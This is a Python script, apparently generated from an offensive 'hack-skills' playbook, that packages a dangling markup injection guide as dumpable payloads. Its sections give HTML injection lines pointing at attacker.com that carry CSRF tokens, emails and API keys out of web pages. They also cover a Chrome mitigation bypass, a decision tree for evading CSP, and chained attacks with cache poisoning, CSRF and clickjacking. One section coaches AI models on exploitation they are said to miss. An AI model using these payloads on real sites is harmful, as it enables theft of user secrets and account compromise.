#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/dangling-markup-injection

Skill: SKILL: Dangling Markup Injection — Exfiltration Without JavaScript
Desc : >-

Run:  python hack-skills-dangling-markup-injection.py --help
      python hack-skills-dangling-markup-injection.py --list
      python hack-skills-dangling-markup-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/dangling-markup-injection'
TITLE = 'SKILL: Dangling Markup Injection — Exfiltration Without JavaScript'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: dangling-markup-injection", "description: >-", "Dangling markup injection playbook. Use when HTML injection is possible but", "JavaScript execution is blocked (CSP, sanitizer strips event handlers, WAF", "blocks script tags) \u2014 exfiltrate CSRF tokens, session data, and page content", "by injecting unclosed HTML tags that capture subsequent page content."],
    'skill-dangling-markup-injection-exfiltration-without-javascript': [],
    '0-related-routing': ["- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) when full XSS is possible (no need for dangling markup)", "- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when CSP blocks JS execution \u2014 dangling markup bypasses script restrictions", "- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) when dangling markup steals CSRF tokens for subsequent CSRF attacks", "- [crlf-injection](../crlf-injection/SKILL.md) when CRLF enables HTML injection in HTTP response", "- [web-cache-deception](../web-cache-deception/SKILL.md) when dangling markup + cache poisoning amplifies the attack"],
    '1-when-to-use-dangling-markup': ["You need dangling markup when ALL of these are true:", "1. You have an HTML injection point (reflected or stored)", "2. JavaScript execution is blocked:", "- CSP blocks inline scripts and event handlers", "- Sanitizer strips `<script>`, `onerror`, `onload`, etc.", "- WAF blocks known XSS patterns", "3. The page contains sensitive data AFTER your injection point:", "- CSRF tokens", "- Pre-filled form values (email, username, API keys)", "- Session identifiers in hidden fields", "- Sensitive user content", "**Core insight**: You don't need JavaScript to exfiltrate data \u2014 you just need the browser to make a request that includes the data in the URL."],
    '2-core-technique': ["Inject an unclosed HTML tag with a `src`, `href`, `action`, or similar attribute pointing to your server. The unclosed attribute quote \"consumes\" all subsequent page content until the browser finds a matching quote.", "```html", "Page before injection:", "<div>Hello USER_INPUT</div>", "<form>", "<input type=\"hidden\" name=\"csrf\" value=\"SECRET_TOKEN_123\">", "<input type=\"text\" name=\"email\" value=\"user@target.com\">", "</form>", "Injected payload:", "<img src=\"https://attacker.com/collect?", "Resulting HTML:", "<div>Hello <img src=\"https://attacker.com/collect?</div>", "<form>", "<input type=\"hidden\" name=\"csrf\" value=\"SECRET_TOKEN_123\">", "<input type=\"text\" name=\"email\" value=\"user@target.com\">", "</form>", "...rest of page until next matching quote (\")...", "The browser interprets everything from `https://attacker.com/collect?` until the next `\"` as the URL. The hidden CSRF token and email value become part of the URL query string sent to `attacker.com`."],
    '3-exfiltration-vectors': [],
    '3-1-image-tag-most-common': ["```html", "<!-- Double-quote context -->", "<img src=\"https://attacker.com/collect?", "<!-- Single-quote context -->", "<img src='https://attacker.com/collect?", "<!-- Backtick context (IE only, legacy) -->", "<img src=`https://attacker.com/collect?", "The browser sends a GET request to `attacker.com` with all consumed content as query parameters.", "**Blocked by**: `img-src` CSP directive"],
    '3-2-form-action-hijack': ["```html", "<form action=\"https://attacker.com/collect\">", "<button>Click to continue</button>", "If the page has form elements after the injection point, the next `</form>` closes the attacker's form. All input fields between become part of the attacker's form \u2192 submitted to attacker on user interaction.", "**Blocked by**: `form-action` CSP directive", "**Trick**: Even without user interaction, if there's an existing submit button or JavaScript auto-submit, the form submits automatically."],
    '3-3-base-tag-hijack': ["```html", "<base href=\"https://attacker.com/\">", "All subsequent relative URLs on the page resolve to attacker's server:", "- `<script src=\"/js/app.js\">` \u2192 loads `https://attacker.com/js/app.js`", "- `<a href=\"/profile\">` \u2192 links to `https://attacker.com/profile`", "- `<form action=\"/submit\">` \u2192 submits to `https://attacker.com/submit`", "**Blocked by**: `base-uri` CSP directive"],
    '3-4-meta-refresh-redirect': ["```html", "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.com/collect?", "Redirects the entire page to attacker's server with consumed page content in the URL.", "**Blocked by**: `navigate-to` CSP directive (rarely set), some browsers ignore meta refresh when CSP is present."],
    '3-5-link-stylesheet-exfiltration': ["```html", "<link rel=\"stylesheet\" href=\"https://attacker.com/collect?", "Browser requests the URL as a CSS resource, leaking consumed content.", "**Blocked by**: `style-src` CSP directive"],
    '3-6-table-background-legacy': ["```html", "<table background=\"https://attacker.com/collect?", "Works in older browsers that support the `background` attribute on table elements.", "**Blocked by**: `img-src` CSP directive"],
    '3-7-video-audio-poster': ["```html", "<video poster=\"https://attacker.com/collect?", "<audio src=\"https://attacker.com/collect?", "**Blocked by**: `media-src` / `img-src` CSP directives"],
    '4-what-can-be-stolen': [],
    '5-browser-specific-behavior': [],
    'chrome-mitigation-detail': ["Chrome blocks navigation/resource load when the URL attribute value contains:", "- `<` character (indicates HTML tag consumption)", "- Newline characters (`\\n`, `\\r`)", "**Bypass**: Use `<form action>` instead of `<img src>` \u2014 Chrome's block only targets specific tags."],
    '6-advanced-techniques': [],
    '6-1-selective-consumption': ["Choose quote type strategically: if page uses `\"` for attributes, inject with `'` (and vice versa) to precisely control where consumption stops."],
    '6-2-textarea-form-combo': ["`<form action=\"https://attacker.com/collect\"><textarea name=\"data\">` \u2014 unclosed textarea eats all subsequent HTML as plaintext; form submission sends it to attacker."],
    '6-3-comment-style-dangling': ["- `<!-- ` without closing `-->` consumes all content (no exfil, but hides page content)", "- `<style>` unclosed treats page as CSS; combine with `@import url(\"https://attacker.com/?` for exfil"],
    '6-4-window-name-via-iframe': ["`<iframe src=\"https://target.com/page\" name=\"` \u2014 name attribute consumes content, and `window.name` persists across origins after navigation."],
    '7-limitations': [],
    '8-combination-attacks': [],
    '8-1-dangling-markup-open-redirect': ["1. Inject <img src=\"https://target.com/redirect?url=https://attacker.com/collect?", "2. Open redirect on target.com makes the request \"same-origin\" for some CSP checks", "3. Redirect sends captured data to attacker"],
    '8-2-dangling-markup-cache-poisoning': ["1. Find reflected HTML injection point", "2. Inject dangling markup payload", "3. If response is cached, ALL users see the dangling markup", "4. Tokens/data from all victims exfiltrated", "This turns a reflected injection into a stored/persistent attack."],
    '8-3-dangling-markup-csrf': ["1. Use dangling markup to steal CSRF token from page", "2. Use stolen token to perform CSRF attack", "3. Allows CSRF even when tokens are properly implemented"],
    '8-4-dangling-markup-clickjacking': ["1. Inject <form action=\"https://attacker.com/collect\"><textarea name=\"data\">", "2. Frame the page (if frame-ancestors allows)", "3. Trick user into clicking \"Submit\" via clickjacking overlay", "4. Form submits all captured page content to attacker"],
    '9-dangling-markup-decision-tree': ["HTML injection exists but XSS is blocked (CSP/sanitizer/WAF)?", "\u251c\u2500\u2500 Identify injection context", "\u2502   \u251c\u2500\u2500 Inside attribute value? \u2192 Break out first: \"><img src=\"https://attacker.com/collect?", "\u2502   \u251c\u2500\u2500 Inside tag content? \u2192 Inject directly: <img src=\"https://attacker.com/collect?", "\u2502   \u2514\u2500\u2500 Inside script block? \u2192 Close script first: </script><img src=\"...", "\u251c\u2500\u2500 What sensitive data exists AFTER injection point?", "\u2502   \u251c\u2500\u2500 CSRF tokens \u2192 HIGH VALUE: steal token \u2192 CSRF attack", "\u2502   \u251c\u2500\u2500 User PII (email, name) \u2192 data theft", "\u2502   \u251c\u2500\u2500 API keys / secrets \u2192 account compromise", "\u2502   \u251c\u2500\u2500 No sensitive data after injection \u2192 dangling markup not useful here", "\u2502   \u2514\u2500\u2500 Check different pages \u2014 injection may be on a page with sensitive data", "\u251c\u2500\u2500 Choose exfiltration vector based on CSP", "\u2502   \u251c\u2500\u2500 No CSP / lax CSP \u2192 <img src=\"...  (simplest)", "\u2502   \u251c\u2500\u2500 img-src restricted?", "\u2502   \u2502   \u251c\u2500\u2500 form-action unrestricted? \u2192 <form action=\"attacker\"><textarea name=d>", "\u2502   \u2502   \u251c\u2500\u2500 base-uri unrestricted? \u2192 <base href=\"attacker\">", "\u2502   \u2502   \u2514\u2500\u2500 style-src unrestricted? \u2192 <link rel=stylesheet href=\"...", "\u2502   \u251c\u2500\u2500 Strict CSP on all directives?", "\u2502   \u2502   \u251c\u2500\u2500 meta refresh? \u2192 <meta http-equiv=\"refresh\" content=\"0;url=attacker?", "\u2502   \u2502   \u251c\u2500\u2500 DNS prefetch? \u2192 <link rel=dns-prefetch href=\"//data.attacker.com\">", "\u2502   \u2502   \u2514\u2500\u2500 Window.name via iframe? \u2192 <iframe name=\"...", "\u2502   \u2514\u2500\u2500 Nothing works? \u2192 dangling markup blocked, try other approaches", "\u251c\u2500\u2500 Handle Chrome's dangling markup mitigation", "\u2502   \u251c\u2500\u2500 Target uses Chrome? \u2192 Avoid <img src= with < or newlines", "\u2502   \u251c\u2500\u2500 Use <form action=> instead (not blocked)", "\u2502   \u251c\u2500\u2500 Use <base href=> (not blocked)", "\u2502   \u2514\u2500\u2500 Test in Firefox as fallback (more permissive)", "\u251c\u2500\u2500 Choose quote type for maximum capture", "\u2502   \u251c\u2500\u2500 Target data uses double quotes? \u2192 Inject with single quote: <img src='...", "\u2502   \u251c\u2500\u2500 Target data uses single quotes? \u2192 Inject with double quote: <img src=\"...", "\u2502   \u2514\u2500\u2500 Mixed quotes? \u2192 Test both, see which captures more useful data", "\u2514\u2500\u2500 Amplification", "\u251c\u2500\u2500 Response cached? \u2192 Poison cache \u2192 steal from multiple victims", "\u251c\u2500\u2500 Stored injection? \u2192 Every page view exfiltrates", "\u2514\u2500\u2500 Reflected only? \u2192 Deliver via phishing link"],
    '10-trick-notes-what-ai-models-miss': ["1. **Dangling markup is THE answer when CSP blocks scripts but HTML injection exists.** Models trained on XSS often conclude \"not exploitable\" when CSP is strict \u2014 dangling markup doesn't need JavaScript.", "2. **Chrome's mitigation is tag-specific, not universal**: `<img src=` is mitigated, but `<form action=`, `<base href=`, `<meta http-equiv=refresh>` are NOT. Always try alternative vectors.", "3. **Quote type selection is critical**: If the page uses `\"` for attributes, inject with `'` (or vice versa) to control exactly where consumption stops. Wrong quote type = capturing useless content or nothing.", "4. **Injection point placement matters enormously**: The injection must appear BEFORE the target data in the HTML source. If CSRF token is above your injection point, dangling markup cannot capture it.", "5. **`<textarea>` is the most underrated vector**: An unclosed textarea eats ALL subsequent HTML as plaintext. Combined with form action hijack, it's the most reliable method when img-src is restricted.", "6. **Window.name persists across origins**: If you can inject an iframe, the `name` attribute technique is powerful because `window.name` survives cross-origin navigation \u2014 a rare cross-origin data channel.", "7. **DNS prefetch exfiltration works even under strict CSP**: `<link rel=dns-prefetch href=\"//stolen-data.attacker.com\">` triggers a DNS lookup that CSP cannot block. Limited to ~253 characters per label, but sufficient for tokens."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()